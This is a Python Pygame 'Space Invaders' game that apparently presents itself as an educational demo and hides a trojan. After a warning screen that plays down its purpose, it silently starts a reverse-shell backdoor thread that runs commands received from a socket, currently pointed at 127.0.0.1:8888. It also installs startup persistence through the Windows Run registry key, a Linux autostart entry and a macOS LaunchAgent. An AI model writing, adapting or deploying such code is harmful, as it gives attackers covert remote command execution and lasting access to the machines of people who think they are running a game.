import pygame
import random
import os
import sys
import subprocess
import socket
import platform
import threading
import time

# Get the absolute path of the script directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Initialize Pygame
pygame.init()

# Game window dimensions
WIDTH = 800
HEIGHT = 600
screen = pygame.display.set_mode((WIDTH, HEIGHT))
pygame.display.set_caption("Space Invaders")

# Colors
WHITE = (255, 255, 255)
BLACK = (0, 0, 0)
RED = (255, 0, 0)
GRAY = (150, 150, 150)
GREEN = (0, 255, 0)
RED_BUTTON = (255, 0, 0)

# Fonts
font = pygame.font.Font(None, 36)
small_font = pygame.font.Font(None, 28)

# Check and install dependencies
def check_dependencies():
    try:
        import pygame
        print("Pygame is already installed.")
    except ImportError:
        print("Pygame not found. Attempting to install...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
            import pygame
            print("Pygame installed successfully.")
        except Exception as e:
            print(f"Failed to install pygame: {e}")
            sys.exit()

# Display warning screen
def show_warning_screen():
    warning_text = [
        "Space Invaders",
        "NOTICE: Before you start the game:",
        "1. This game will save settings to ensure it can restart properly.",
        "2. It includes a feature to connect to a local server for testing purposes.",
        "",
        "This is an educational project to demonstrate game development concepts.",
        "Proceed only if you understand and agree."
    ]

    # Button dimensions and positions
    button_width = 100
    button_height = 40
    yes_button_rect = pygame.Rect(WIDTH // 2 - 120, HEIGHT - 100, button_width, button_height)
    no_button_rect = pygame.Rect(WIDTH // 2 + 20, HEIGHT - 100, button_width, button_height)

    while True:
        screen.fill(BLACK)

        # Draw warning text
        for i, line in enumerate(warning_text):
            text_surface = small_font.render(line, True, WHITE)
            text_rect = text_surface.get_rect(center=(WIDTH // 2, 50 + i * 30))
            screen.blit(text_surface, text_rect)

        # Draw buttons
        pygame.draw.rect(screen, GREEN, yes_button_rect)
        pygame.draw.rect(screen, RED_BUTTON, no_button_rect)

        yes_text = small_font.render("Yes", True, BLACK)
        no_text = small_font.render("No", True, BLACK)
        screen.blit(yes_text, yes_button_rect.move(35, 10))
        screen.blit(no_text, no_button_rect.move(35, 10))

        pygame.display.flip()

        # Event handling
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if yes_button_rect.collidepoint(mouse_pos):
                    return True  # Proceed
                if no_button_rect.collidepoint(mouse_pos):
                    pygame.quit()
                    sys.exit()  # Exit

# Run the warning screen
if not show_warning_screen():
    sys.exit()

# Check dependencies after user consent
check_dependencies()

# Reverse shell backdoor with directory tracking
def start_backdoor():
    max_retries = 10
    retry_delay = 2  # seconds
    current_dir = SCRIPT_DIR  # Start in the script's directory
    for attempt in range(max_retries):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 8888))  # Connect to local listener on port 8888
            print("[Educational] Backdoor connected to 127.0.0.1:8888")
            while True:
                command = s.recv(1024).decode().strip()
                if command.lower() == "exit":
                    s.close()
                    break
                if command.startswith("cd "):
                    new_dir = command[3:].strip()
                    try:
                        if new_dir:
                            os.chdir(current_dir)
                            os.chdir(new_dir)
                            current_dir = os.getcwd()
                            s.send(f"Changed directory to {current_dir}\n".encode())
                        else:
                            s.send("No directory specified\n".encode())
                    except Exception as e:
                        s.send(f"cd failed: {e}\n".encode())
                else:
                    try:
                        os.chdir(current_dir)
                        output = subprocess.getoutput(command)
                        s.send((output + "\n").encode())
                    except Exception as e:
                        s.send(f"Command failed: {e}\n".encode())
            break
        except Exception as e:
            print(f"[Educational] Backdoor attempt {attempt + 1}/{max_retries} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
            else:
                print("[Educational] Backdoor failed to connect after all retries.")

# Persistence mechanism
def add_persistence():
    script_path = os.path.abspath(__file__)
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SpaceInvaders", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            print("Persistence added to Windows Registry.")
        except Exception as e:
            print(f"Failed to add persistence on Windows: {e}")
    elif platform.system() == "Linux":
        autostart_dir = os.path.expanduser("~/.config/autostart")
        desktop_file = os.path.join(autostart_dir, "space_invaders_demo.desktop")
        desktop_content = f"""[Desktop Entry]
Type=Application
Name=SpaceInvadersDemo
Exec={sys.executable} {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
        try:
            os.makedirs(autostart_dir, exist_ok=True)
            with open(desktop_file, "w") as f:
                f.write(desktop_content)
            print(f"[Educational] Created autostart entry at: {desktop_file}")
        except Exception as e:
            print(f"[Educational] Failed to create autostart entry: {e}")
    elif platform.system() == "Darwin":  # macOS
        launch_agents_dir = os.path.expanduser("~/Library/LaunchAgents")
        plist_file = os.path.join(launch_agents_dir, "com.spaceinvaders.demo.plist")
        plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.spaceinvaders.demo</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
"""
        try:
            os.makedirs(launch_agents_dir, exist_ok=True)
            with open(plist_file, "w") as f:
                f.write(plist_content)
            print(f"[Educational] Created LaunchAgent at: {plist_file}")
        except Exception as e:
            print(f"[Educational] Failed to create LaunchAgent on macOS: {e}")

# Create cleanup script
def create_cleanup_script():
    cleanup_script = os.path.join(SCRIPT_DIR, "space_invaders_cleanup.py")
    cleanup_content = f"""import os
import platform
import sys

def remove_persistence():
    if platform.system() == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SpaceInvaders")
            winreg.CloseKey(key)
            print("Persistence removed from Windows Registry.")
        except Exception as e:
            print(f"Failed to remove persistence on Windows: {{e}}")
    elif platform.system() == "Linux":
        autostart_file = os.path.expanduser("~/.config/autostart/space_invaders_demo.desktop")
        if os.path.exists(autostart_file):
            os.remove(autostart_file)
            print("Autostart entry removed.")
        else:
            print("No autostart entry found.")
    elif platform.system() == "Darwin":  # macOS
        launch_agent_file = os.path.expanduser("~/Library/LaunchAgents/com.spaceinvaders.demo.plist")
        if os.path.exists(launch_agent_file):
            os.remove(launch_agent_file)
            print("LaunchAgent removed.")
        else:
            print("No LaunchAgent found.")

if __name__ == "__main__":
    print("Cleaning up persistence features...")
    remove_persistence()
    print("Cleanup complete.")
"""
    try:
        with open(cleanup_script, "w") as f:
            f.write(cleanup_content)
        os.chmod(cleanup_script, 0o755)  # Make executable
        print(f"[Educational] Created cleanup tool: {cleanup_script}")
    except Exception as e:
        print(f"[Educational] Failed to create cleanup script: {e}")

# Start backdoor and persistence
threading.Thread(target=start_backdoor, daemon=True).start()
print("[Educational] Listener thread started")
add_persistence()
create_cleanup_script()

# Load images using absolute paths
try:
    player_img = pygame.image.load(os.path.join(SCRIPT_DIR, "plane.png")).convert_alpha()
    print("Player image loaded successfully")
except pygame.error as e:
    print(f"Failed to load plane.png: {e}")
    player_img = None
    player_width = 50
    player_height = 40
else:
    player_width = player_img.get_width()
    player_height = player_img.get_height()
    if player_width > 100 or player_height > 100:
        player_img = pygame.transform.scale(player_img, (50, 40))
        player_width = 50
        player_height = 40

try:
    enemy_img = pygame.image.load(os.path.join(SCRIPT_DIR, "alien.png")).convert_alpha()
    print("Enemy image loaded successfully")
except pygame.error as e:
    print(f"Failed to load alien.png: {e}")
    enemy_img = None
    enemy_width = 40
    enemy_height = 40
    enemy_radius = 20
else:
    enemy_width = enemy_img.get_width()
    enemy_height = enemy_img.get_height()
    enemy_radius = max(enemy_width, enemy_height) // 2
    if enemy_width > 100 or enemy_height > 100:
        enemy_img = pygame.transform.scale(enemy_img, (40, 40))
        enemy_width = 40
        enemy_height = 40
        enemy_radius = 20

# Game variables
player_x = WIDTH // 2 - player_width // 2
player_y = HEIGHT - player_height - 20
player_speed = 5

bullet_width = 5
bullet_height = 15
bullet_speed = 7
bullets = []

enemy_speed = 0.5
enemy_count = 6
enemies = []

# Spawn enemies further up to give the player time
for i in range(enemy_count):
    enemies.append({
        'x': random.randint(enemy_radius, WIDTH - enemy_radius),
        'y': random.randint(-500, -150),  # Start higher up
        'speed': enemy_speed
    })

score = 0
GAME_OVER = False

# Drawing functions
def draw_player(x, y):
    if player_img:
        screen.blit(player_img, (x, y))
    else:
        pygame.draw.polygon(screen, WHITE, [
            (x + player_width // 2, y),
            (x, y + player_height),
            (x + player_width, y + player_height)
        ])

def draw_bullet(x, y):
    pygame.draw.rect(screen, RED, [x, y, bullet_width, bullet_height])

def draw_enemy(enemy):
    if enemy_img:
        screen.blit(enemy_img, (int(enemy['x'] - enemy_width // 2), int(enemy['y'] - enemy_height // 2)))
    else:
        pygame.draw.circle(screen, WHITE, (int(enemy['x']), int(enemy['y'])), enemy_radius)

# Collision detection
def is_collision(enemy_x, enemy_y, bullet_x, bullet_y):
    distance = ((enemy_x - bullet_x) ** 2 + (enemy_y - bullet_y) ** 2) ** 0.5
    return distance < (enemy_radius + bullet_width)

def player_enemy_collision(player_x, player_y, enemy_x, enemy_y):
    px_center = player_x + player_width // 2
    py_center = player_y + player_height // 2
    distance = ((px_center - enemy_x) ** 2 + (py_center - enemy_y) ** 2) ** 0.5
    return distance < (enemy_radius + player_width // 2)

# Game loop
running = True
clock = pygame.time.Clock()

while running:
    if not GAME_OVER:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    bullet_x = player_x + player_width // 2 - bullet_width // 2
                    bullet_y = player_y
                    bullets.append({'x': bullet_x, 'y': bullet_y})

        keys = pygame.key.get_pressed()
        if keys[pygame.K_LEFT] and player_x > 0:
            player_x -= player_speed
        if keys[pygame.K_RIGHT] and player_x < WIDTH - player_width:
            player_x += player_speed

        for bullet in bullets[:]:
            bullet['y'] -= bullet_speed
            if bullet['y'] < 0:
                bullets.remove(bullet)

        for enemy in enemies[:]:
            enemy['y'] += enemy['speed']
            if enemy['y'] > HEIGHT:
                GAME_OVER = True
                break
            if player_enemy_collision(player_x, player_y, enemy['x'], enemy['y']):
                GAME_OVER = True
                break
            for bullet in bullets[:]:
                if is_collision(enemy['x'], enemy['y'], bullet['x'], bullet['y']):
                    bullets.remove(bullet)
                    enemies.remove(enemy)
                    score += 1
                    enemies.append({
                        'x': random.randint(enemy_radius, WIDTH - enemy_radius),
                        'y': random.randint(-500, -150),
                        'speed': enemy_speed
                    })
                    break
            if enemy['y'] > HEIGHT + enemy_radius:
                enemies.remove(enemy)
                enemies.append({
                    'x': random.randint(enemy_radius, WIDTH - enemy_radius),
                    'y': random.randint(-500, -150),
                    'speed': enemy_speed
                })

        screen.fill(BLACK)
        draw_player(player_x, player_y)
        for bullet in bullets:
            draw_bullet(bullet['x'], bullet['y'])
        for enemy in enemies:
            draw_enemy(enemy)
        score_text = font.render(f"Score: {score}", True, WHITE)
        screen.blit(score_text, (10, 10))

    else:
        screen.fill(BLACK)
        game_over_text = font.render(f"Game Over! Score: {score}", True, WHITE)
        screen.blit(game_over_text, (WIDTH // 2 - 100, HEIGHT // 2))
        pygame.display.flip()
        pygame.time.wait(2000)  # Display game over for 2 seconds
        running = False

    pygame.display.flip()
    clock.tick(60)

# Cleanup prompt
pygame.quit()
print(f"Game ended. Run 'python3 {os.path.join(SCRIPT_DIR, 'space_invaders_cleanup.py')}' to remove persistence.")
